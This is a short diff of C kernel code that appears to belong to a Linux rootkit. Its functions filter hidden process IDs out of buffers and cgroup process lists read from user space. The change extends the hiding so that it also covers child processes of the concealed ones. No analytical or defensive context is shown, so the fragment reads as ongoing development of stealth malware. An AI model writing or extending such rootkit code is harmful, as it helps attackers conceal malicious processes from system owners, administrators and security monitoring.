@@ -86,10 +86,10 @@ static notrace ssize_t filter_hidden_pids_from_buffer(char *buf, ssize_t len)
     
     if (!buf || len <= 0)
         return len;
-    
-    if (hidden_count <= 0)
+
+    if (hidden_count <= 0 && child_count <= 0)
         return len;
-    
+
     out = kmalloc(len + 1, GFP_ATOMIC);
     if (!out)
         return len;
@@ -143,7 +143,7 @@ static notrace ssize_t filter_cgroup_pids(char __user *user_buf, ssize_t bytes_r
     if (bytes_read <= 0 || !user_buf)
         return bytes_read;
     
-    if (hidden_count <= 0)
+    if (hidden_count <= 0 && child_count <= 0)
         return bytes_read;
     
     kernel_buf = kmalloc(bytes_read + 1, GFP_ATOMIC);
